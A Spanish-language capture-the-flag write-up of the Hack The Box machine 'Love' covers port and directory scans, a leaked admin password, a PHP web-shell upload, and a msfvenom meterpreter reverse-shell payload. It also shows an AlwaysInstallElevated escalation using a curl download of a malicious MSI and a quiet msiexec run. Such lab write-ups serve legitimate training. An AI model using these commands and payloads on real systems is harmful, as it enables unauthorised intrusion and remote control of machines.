
<h1 align="center">
  <br>
  <img src="https://raw.githubusercontent.com/s4yhii/HackTheBox-Writeups/main/love/img/love.png" alt="Love">
  <br>
</h1>

***

**Machine IP** : 10.10.10.239

**DATE**  : 26/06/2021

***


## Reconocimiento
Primero hacemos un escaneo de puertos para saber cuales están abiertos y conocer sus servicios correspondientes.

## Nmap 

```bash
❯ nmap -sC -sV -n -p443,445,80,135,139,3306,5000,7680,47001,5985,5986 -Pn 10.10.10.239        17s
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-26 03:27 EDT
Nmap scan report for 10.10.10.239
Host is up (0.12s latency).

PORT      STATE SERVICE      VERSION
80/tcp    open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: Voting System using PHP
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
443/tcp   open  ssl/http     Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: 403 Forbidden
| ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in
| Not valid before: 2021-01-18T14:00:16
|_Not valid after:  2022-01-18T14:00:16
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
445/tcp   open  microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)
3306/tcp  open  mysql?
| fingerprint-strings: 
|   GenericLines, GetRequest, JavaRMI, NCP, NULL, SMBProgNeg, TerminalServerCookie, X11Probe, giop: 
|_    Host '10.10.14.28' is not allowed to connect to this MariaDB server
5000/tcp  open  http         Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: 403 Forbidden
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
5986/tcp  open  ssl/http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
| ssl-cert: Subject: commonName=LOVE
| Subject Alternative Name: DNS:LOVE, DNS:Love
| Not valid before: 2021-04-11T14:39:19
|_Not valid after:  2024-04-10T14:39:19
|_ssl-date: 2021-06-26T07:54:21+00:00; +25m42s from scanner time.
| tls-alpn: 
|_  http/1.1
7680/tcp  open  pando-pub?
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.91%I=7%D=6/26%Time=60D6D6EB%P=x86_64-pc-linux-gnu%r(NU
SF:LL,4A,"F\0\0\x01\xffj\x04Host\x20'10\.10\.14\.28'\x20is\x20not\x20allow
SF:ed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(GenericLines
SF:,4A,"F\0\0\x01\xffj\x04Host\x20'10\.10\.14\.28'\x20is\x20not\x20allowed
SF:\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(GetRequest,4A,
SF:"F\0\0\x01\xffj\x04Host\x20'10\.10\.14\.28'\x20is\x20not\x20allowed\x20
SF:to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(TerminalServerCook
SF:ie,4A,"F\0\0\x01\xffj\x04Host\x20'10\.10\.14\.28'\x20is\x20not\x20allow
SF:ed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(SMBProgNeg,4
SF:A,"F\0\0\x01\xffj\x04Host\x20'10\.10\.14\.28'\x20is\x20not\x20allowed\x
SF:20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(X11Probe,4A,"F\0
SF:\0\x01\xffj\x04Host\x20'10\.10\.14\.28'\x20is\x20not\x20allowed\x20to\x
SF:20connect\x20to\x20this\x20MariaDB\x20server")%r(NCP,4A,"F\0\0\x01\xffj
SF:\x04Host\x20'10\.10\.14\.28'\x20is\x20not\x20allowed\x20to\x20connect\x
SF:20to\x20this\x20MariaDB\x20server")%r(JavaRMI,4A,"F\0\0\x01\xffj\x04Hos
SF:t\x20'10\.10\.14\.28'\x20is\x20not\x20allowed\x20to\x20connect\x20to\x2
SF:0this\x20MariaDB\x20server")%r(giop,4A,"F\0\0\x01\xffj\x04Host\x20'10\.
SF:10\.14\.28'\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20M
SF:ariaDB\x20server");
Service Info: Hosts: www.example.com, LOVE, www.love.htb; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h10m44s, deviation: 3h30m03s, median: 25m41s
| smb-os-discovery: 
|   OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: Love
|   NetBIOS computer name: LOVE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-06-26T00:54:15-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-06-26T07:54:13
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 62.43 seconds

```

En el puerto 80, observamos un servidor web abierto.

![](https://raw.githubusercontent.com/s4yhii/HackTheBox-Writeups/main/love/img/voting.png)

Y  en el puerto 443, tenemos un servidor web corriendo con `commonName=staging.love.htb`, añadiendo este host al `etc/hosts`, podremos visualizar otra pagina web con el dominio `staging.love.htb`.

![](https://raw.githubusercontent.com/s4yhii/HackTheBox-Writeups/main/love/img/scanner.png)

Existe un tercer servidor web en el puerto 5000, pero es inaccesible.

Usaremos la herramienta `gobuster` para el escaneo de directorios y archivos en estas 2 paginas web.

```bash
~ ❯ gobuster dir -u http://10.10.10.239 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -t 100 -x php,txt,html
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.239
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
2021/06/26 03:07:57 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 338] 
/login.php            (Status: 302) [Size: 0]
/index.php            (Status: 200) [Size: 4388]                 
/home.php             (Status: 302) [Size: 0] 
/admin                (Status: 301) [Size: 337] 
/plugins              (Status: 301) [Size: 339]
/includes             (Status: 301) [Size: 340] 
/logout.php           (Status: 302) [Size: 0]    
/preview.php          (Status: 302) [Size: 0] 
/dist                 (Status: 301) [Size: 336] 
```

```bash
~ ❯ gobuster dir -u http://staging.love.htb/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -t 100 -x php,txt,html
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://staging.love.htb/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
2021/06/26 03:08:53 Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 5357]
/beta.php             (Status: 200) [Size: 4997]
/examples             (Status: 503) [Size: 406] 
/licenses             (Status: 403) [Size: 425] 
```

Luego de probar con todos los directorios, encontré un analizador web en el dominio `beta.php` , introduciendo la url del puerto 5000, la cual es `http://10.10.10.239:5000`, encontramos las credenciales `admin:@LoveIsInTheAir!!!!` 

![](https://raw.githubusercontent.com/s4yhii/HackTheBox-Writeups/main/love/img/scanweb.png)

Luego nos logeamos en la otra pagina dentro del directorio `admin`, la cual sigue el siguiente dominio `http://10.10.10.239/admin/index.php`.

![](https://raw.githubusercontent.com/s4yhii/HackTheBox-Writeups/main/love/img/adminweb.png)

Buscando informacion sobre la version del sistema y obteniendo pistas del directorio `images`, me pude dar cuenta que la web admitia subida de archivos, entonces probé con subir un `backdoor` que actuara como una webshell con msfvenom y metasploit para generar el `payload`

```bash
msfvenom -p windows/meterpreter/reverse_tcp lport=4445 lhost=10.10.14.28 -f exe -o back.exe`
```

![](https://raw.githubusercontent.com/s4yhii/HackTheBox-Writeups/main/love/img/msf.png)

Y estableciendo el  listener con `metasploit`

![](https://raw.githubusercontent.com/s4yhii/HackTheBox-Writeups/main/love/img/metas.png)

Luego subí la `web shell` de esta página ([Simple-PHP-Web-Shell/index.php at master · artyuum/Simple-PHP-Web-Shell (github.com)](https://github.com/artyuum/Simple-PHP-Web-Shell/blob/master/index.php)) para ejecutar el backdoor que generé con msfvenom.

![](https://raw.githubusercontent.com/s4yhii/HackTheBox-Writeups/main/love/img/webshell.png)

Ejecutando el backdoor llamado `back.exe` establecemos conexion y obtenemos una shell como el usuario `phoebe`

## Escalamiento de privilegios

Ahora viene la parte más trabajosa, la cual es la escalada , luego de activar una shell cmd con el comando `execute -f cmd.exe -i -H`  corremos winpeas dentro de la maquina y nos encontramos con la vulnerabilidad de `AlwaysInstalledElevated` que se trata de políticas de usuarios mal configurada, eso pude explotarlo con esta guia [AlwaysInstalledElevate](https://www.hackingarticles.in/windows-privilege-escalation-alwaysinstallelevated/)

Creando el `payload` con `msfvenom` para elevar privilegios 

![](https://raw.githubusercontent.com/s4yhii/HackTheBox-Writeups/main/love/img/priv.png)

Luego lo copiamos a la maquina a comprometer con el comando

```bash
curl http://<your IP>/revers.msi -o alwaysinstallelevated.msi
```

![](https://raw.githubusercontent.com/s4yhii/HackTheBox-Writeups/main/love/img/subida.png)

Luego establecemos un `listener` en nuestra maquina con `netcat` y ejecutamos el `payload` en la maquina love con el comando

```bash
msiexec /quiet /qn /i alwaysinstallelevated.msi
```

Finalmente obtenemos una shell en nuestra maquina y obtenemos el `root.txt`

![](https://raw.githubusercontent.com/s4yhii/HackTheBox-Writeups/main/love/img/root.png)

Gracias por leer hasta aquí.